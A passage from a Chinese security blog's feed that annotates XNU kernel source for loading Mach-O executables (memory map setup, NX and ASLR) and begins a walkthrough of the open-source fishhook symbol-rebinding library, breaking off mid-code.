VM_MAP_NULL) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = current_task();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * If we are spawning, we have created backing objects for the process</span><br><span class="line">	 * already, which include non-lazily creating the task map.  So we</span><br><span class="line">	 * are going to switch out the task map with one appropriate for the</span><br><span class="line">	 * bitness of the image being loaded.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (spawn) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = get_threadtask(thread);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//如果有new_map就用参数传进来的new_map</span></span><br><span class="line">  	<span class="comment">//否则就通过pmap_create,vm_map_create函数创建新的内存空间</span></span><br><span class="line">	<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="keyword">task_t</span> ledger_task;</span><br><span class="line">		<span class="keyword">if</span> (imgp-&gt;ip_new_thread) &#123;</span><br><span class="line">			ledger_task = get_threadtask(imgp-&gt;ip_new_thread);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ledger_task = task;</span><br><span class="line">		&#125;</span><br><span class="line">		pmap = pmap_create(get_task_ledger(ledger_task),</span><br><span class="line">				   (<span class="keyword">vm_map_size_t</span>) <span class="number">0</span>,</span><br><span class="line">				   ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) != <span class="number">0</span>));</span><br><span class="line">		pal_switch_pmap(thread, pmap, imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT);</span><br><span class="line">		<span class="built_in">map</span> = vm_map_create(pmap,</span><br><span class="line">				<span class="number">0</span>,</span><br><span class="line">				vm_compute_max_offset(((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == IMGPF_IS_64BIT)),</span><br><span class="line">				TRUE);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">map</span> = new_map;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span>   (__ARM_ARCH_7K__ &gt;= <span class="number">2</span>) &amp;&amp; defined(PLATFORM_WatchOS)</span></span><br><span class="line">	<span class="comment">/* enforce 16KB alignment for watch targets with new ABI */</span></span><br><span class="line">	vm_map_set_page_shift(<span class="built_in">map</span>, SIXTEENK_PAGE_SHIFT);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">/* __arm64__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span>	CONFIG_ENFORCE_SIGNED_CODE</span></span><br><span class="line">	<span class="comment">/* This turns off faulting for executable pages, which allows</span><br><span class="line">	 * to circumvent Code Signing Enforcement. The per process</span><br><span class="line">	 * flag (CS_ENFORCEMENT) is not set yet, but we can use the</span><br><span class="line">	 * global flag.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ( !cs_enforcement(<span class="literal">NULL</span>) &amp;&amp; (header-&gt;flags &amp; MH_ALLOW_STACK_EXECUTION) )</span><br><span class="line">	        vm_map_disable_NX(<span class="built_in">map</span>);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Forcibly disallow execution from data pages on even if the arch</span><br><span class="line">	 * normally permits it. */</span></span><br><span class="line">  	<span class="comment">//将内存设置为不可执行，用来防止溢出漏洞的利用</span></span><br><span class="line">	<span class="keyword">if</span> ((header-&gt;flags &amp; MH_NO_HEAP_EXECUTION) &amp;&amp; !(imgp-&gt;ip_flags &amp; IMGPF_ALLOW_DATA_EXEC))</span><br><span class="line">		vm_map_disallow_data_exec(<span class="built_in">map</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Compute a random offset for ASLR, and an independent random offset for dyld.</span><br><span class="line">	 */</span></span><br><span class="line">  	<span class="comment">//地址随机，计算ASLR的偏移量</span></span><br><span class="line">	<span class="keyword">if</span> (!(imgp-&gt;ip_flags &amp; IMGPF_DISABLE_ASLR)) &#123;</span><br><span class="line">		<span class="keyword">uint64_t</span> max_slide_pages;</span><br><span class="line"></span><br><span class="line">		max_slide_pages = vm_map_get_max_aslr_slide_pages(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		aslr_offset = random();</span><br><span class="line">		aslr_offset %= max_slide_pages;</span><br><span class="line">		aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">		dyld_aslr_offset = random();</span><br><span class="line">		dyld_aslr_offset %= max_slide_pages;</span><br><span class="line">		dyld_aslr_offset &lt;&lt;= vm_map_page_shift(<span class="built_in">map</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!result)</span><br><span class="line">		result = &amp;myresult;</span><br><span class="line"></span><br><span class="line">	*result = load_result_null;</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//解析macho的文件格式</span></span><br><span class="line">	lret = parse_machfile(vp, <span class="built_in">map</span>, thread, header, file_offset, macho_size,</span><br><span class="line">	                      <span class="number">0</span>, (<span class="keyword">int64_t</span>)aslr_offset, (<span class="keyword">int64_t</span>)dyld_aslr_offset, result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">			vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(lret);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * On x86, for compatibility, don't enforce the hard page-zero restriction for 32-bit binaries.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		enforce_hard_pagezero = FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * Check to see if the page zero is enforced by the map-&gt;min_offset.</span><br><span class="line">	 */</span> </span><br><span class="line">	<span class="keyword">if</span> (enforce_hard_pagezero &amp;&amp;</span><br><span class="line">	    (vm_map_has_hard_pagezero(<span class="built_in">map</span>, <span class="number">0x1000</span>) == FALSE)) &#123;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> (LOAD_BADMACHO);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 *	Commit to new map.</span><br><span class="line">	 *</span><br><span class="line">	 *	Swap the new map for the old, which  consumes our new map</span><br><span class="line">	 *	reference but each leaves us responsible for the old_map reference.</span><br><span class="line">	 *	That lets us get off the pmap associated with it, and</span><br><span class="line">	 *	then we can release it.</span><br><span class="line">	 */</span></span><br><span class="line">	 <span class="comment">//用新申请的内存替换原来的内存</span></span><br><span class="line">	 <span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * If this is an exec, then we are going to destroy the old</span><br><span class="line">		 * task, and it's correct to halt it; if it's spawn, the</span><br><span class="line">		 * task is not yet running, and it makes no sense.</span><br><span class="line">		 */</span></span><br><span class="line">	 	<span class="keyword">if</span> (!spawn) &#123;</span><br><span class="line">			<span class="comment">/*</span><br><span class="line">			 * Mark the task as halting and start the other</span><br><span class="line">			 * threads towards terminating themselves.  Then</span><br><span class="line">			 * make sure any threads waiting for a process</span><br><span class="line">			 * transition get informed that we are committed to</span><br><span class="line">			 * this transition, and then finally complete the</span><br><span class="line">			 * task halting (wait for threads and then cleanup</span><br><span class="line">			 * task resources).</span><br><span class="line">			 *</span><br><span class="line">			 * <span class="doctag">NOTE:</span> task_start_halt() makes sure that no new</span><br><span class="line">			 * threads are created in the task during the transition.</span><br><span class="line">			 * We need to mark the workqueue as exiting before we</span><br><span class="line">			 * wait for threads to terminate (at the end of which</span><br><span class="line">			 * we no longer have a prohibition on thread creation).</span><br><span class="line">			 * </span><br><span class="line">			 * Finally, clean up any lingering workqueue data structures</span><br><span class="line">			 * that may have been left behind by the workqueue threads</span><br><span class="line">			 * as they exited (and then clean up the work queue itself).</span><br><span class="line">			 */</span></span><br><span class="line">			kret = task_start_halt(task);</span><br><span class="line">			<span class="keyword">if</span> (kret != KERN_SUCCESS) &#123;</span><br><span class="line">				vm_map_deallocate(<span class="built_in">map</span>);	<span class="comment">/* will lose pmap reference too */</span></span><br><span class="line">				<span class="keyword">return</span> (LOAD_FAILURE);</span><br><span class="line">			&#125;</span><br><span class="line">			proc_transcommit(p, <span class="number">0</span>);</span><br><span class="line">			workqueue_mark_exiting(p);</span><br><span class="line">			task_complete_halt(task);</span><br><span class="line">			workqueue_exit(p);</span><br><span class="line">			kqueue_dealloc(p-&gt;p_wqkqueue);</span><br><span class="line">			p-&gt;p_wqkqueue = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		old_map = swap_task_map(old_task, thread, <span class="built_in">map</span>, !spawn);</span><br><span class="line">		vm_map_deallocate(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(LOAD_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数主要做了<code>macho</code>文件解析之外其他所有和加载相关的工作。</p>
<ul>
<li>对新的task做了内存的分配</li>
<li>加强安全方面的设置主要是<code>DEP</code>和<code>ASRL</code></li>
<li>调用函数解析macho文件</li>
<li>解析成功之后，用新申请的内存替换旧的内存。</li>
</ul>
<h2 id="1-5_parse_machfile">1.5 parse_machfile</h2><p>这个函数做的事情就非常的简单清楚了，就是将<code>macho</code>文件解析，并且映射到内存中。</p>
<p>在我的<a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/#0x03_Load_Commands" target="_blank" rel="external">macho文件格式分析</a>中已经分析过这一块代码了。这里就不复述了。</p>
<h1 id="0x02_小结">0x02 小结</h1><p>通过对整个流程源码的一次简单梳理，大致明白了整个流程在源码中是怎么样实现的，在研究这方面的漏洞的时候可以更快的明白问题出在哪里，也可能更深刻的理解漏洞的成因以及重现的方法。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    研究<code>OS X</code>安全方面的知识需要对<code>mach-o</code>加载的流程需要有一个比较完整的理解，断断续续一个月的时间里面，通过对源码的阅读对<code>mach-o</code>的加载有一个比较基本的认识，在遇到各个具体的问题是才能更好的理解和操作。</p>
<p>​    其他相关文章可以看这里，基本涵盖了从内核态到应用层的相关源码的简单分析。还有不足之处在遇到相关的问题时也会加到这一系列文章中。</p>
<p>​    1.<a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">mach-o加载流程学习-dyld对主image的处理流程</a></p>
<p>​    2.<a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">mach-o加载流程学习-dyld对依赖库的加载流程</a></p>
<p>​    3.mach-o加载流程学习-内核对mach-o文件的加载流程(本文)</p>
<p>​    </p>
<p>​    通过一张图片，可以比较清楚的理解整个流程。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/f10c5443276635863d7ac7aea6fa2e6db76ce2c3/png/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p>]]>
    
    </summary>
    
      <category term="OSX" scheme="http://yoursite.com/tags/OSX/"/>
    
      <category term="execve" scheme="http://yoursite.com/tags/execve/"/>
    
      <category term="kernel" scheme="http://yoursite.com/tags/kernel/"/>
    
      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[fishhook源码分析]]></title>
    <link href="http://yoursite.com/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/03/22/fishhook源码分析/</id>
    <published>2016-03-22T15:14:53.000Z</published>
    <updated>2016-03-24T03:35:54.000Z</updated>
    <content type="html"><![CDATA[<p>没什么特别要说的，详细看代码，可以结合之前的两篇文章，更好的理解这部分内容。</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">mach-o格式分析</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/" target="_blank" rel="external">mach-o延时绑定</a><br><a id="more"></a></p>
<h1 id="源码">源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright (c) 2013, Facebook, Inc.</span></span><br><span class="line"><span class="comment">// All rights reserved.</span></span><br><span class="line"><span class="comment">// Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">// modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment">//   * Redistributions of source code must retain the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment">//   * Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment">//     this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment">//     and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment">//   * Neither the name Facebook nor the names of its contributors may be used to</span></span><br><span class="line"><span class="comment">//     endorse or promote products derived from this software without specific</span></span><br><span class="line"><span class="comment">//     prior written permission.</span></span><br><span class="line"><span class="comment">// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</span></span><br><span class="line"><span class="comment">// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment">// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span></span><br><span class="line"><span class="comment">// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span></span><br><span class="line"><span class="comment">// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line"><span class="comment">// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span></span><br><span class="line"><span class="comment">// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span></span><br><span class="line"><span class="comment">// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span></span><br><span class="line"><span class="comment">// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import <span class="string">"fishhook.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#import &lt;dlfcn.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;string.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/dyld.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/loader.h&gt;</span></span><br><span class="line"><span class="preprocessor">#import &lt;mach-o/nlist.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> __LP64__</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header_64 <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command_64 <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section_64 <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist_64 <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT_64</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> mach_header <span class="keyword">mach_header_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> segment_command <span class="keyword">segment_command_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> section <span class="keyword">section_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nlist <span class="keyword">nlist_t</span>;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LC_SEGMENT_ARCH_DEPENDENT LC_SEGMENT</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span> SEG_DATA_CONST</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SEG_DATA_CONST  <span class="string">"__DATA_CONST"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> rebindings_entry &#123;</span><br><span class="line">  <span class="keyword">struct</span> rebinding *rebindings;</span><br><span class="line">  <span class="keyword">size_t</span> rebindings_nel;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">struct</span> rebindings_entry *_rebindings_head;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">prepend_rebindings</span><span class="params">(<span class="keyword">struct</span> rebindings_entry **rebindings_head,</span><br><span class="line">                              <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                              size_t nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> rebindings_entry *new_entry = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebindings_entry));</span><br><span class="line">  <span class="keyword">if</span> (!new_entry) &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  new_entry-&gt;rebindings = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  <span class="keyword">if</span> (!new_entry-&gt;rebindings) &#123;</span><br><span class="line">    <span class="built_in">free</span>(new_entry);</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(new_entry-&gt;rebindings, rebindings, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> rebinding) * nel);</span><br><span class="line">  new_entry-&gt;rebindings_nel = nel;</span><br><span class="line">  new_entry-&gt;next = *rebindings_head;</span><br><span class="line">  *rebindings_head = new_entry;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_rebinding_with_section</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                           section_t *section,</span><br><span class="line">                                           intptr_t slide,</span><br><span class="line">                                           nlist_t *symtab,</span><br><span class="line">                                           <span class="keyword">char</span> *strtab,</span><br><span class="line">                                           uint32_t *indirect_symtab)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//__la_symbol_ptr的reserved1字段标识了section描述的符号在符号表中开始的index</span></span><br><span class="line">  <span class="comment">//动态符号表中第一个需要解析的符号 开始地址</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">void</span> **indirect_symbol_bindings = (<span class="keyword">void</span> **)((<span class="keyword">uintptr_t</span>)slide + section-&gt;addr);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; section-&gt;size / <span class="keyword">sizeof</span>(<span class="keyword">void</span> *); i++) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> symtab_index = indirect_symbol_indices[i];</span><br><span class="line">    <span class="keyword">if</span> (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||</span><br><span class="line">        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//获取每一个需要动态解析的符号在符号表中的地址</span></span><br><span class="line">    <span class="keyword">uint32_t</span> strtab_offset = symtab[symtab_index].n_un.n_strx;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//通过符号表中每一个导入符号的字符串表偏移量获取符号对应的字符串（符号的名字）</span></span><br><span class="line">    <span class="keyword">char</span> *symbol_name = strtab + strtab_offset;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *cur = rebindings;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur-&gt;rebindings_nel; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(symbol_name) &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">		  <span class="comment">//找到相同的函数替换指针</span></span><br><span class="line">          <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">              indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">            *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">          &#125;</span><br><span class="line">          indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">          <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  symbol_loop:;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef struct &#123;</span></span><br><span class="line"><span class="comment">//    const char *dli_fname;  /* Pathname of shared object that</span></span><br><span class="line"><span class="comment">//                               contains address */</span></span><br><span class="line"><span class="comment">//    void       *dli_fbase;  /* Address at which shared 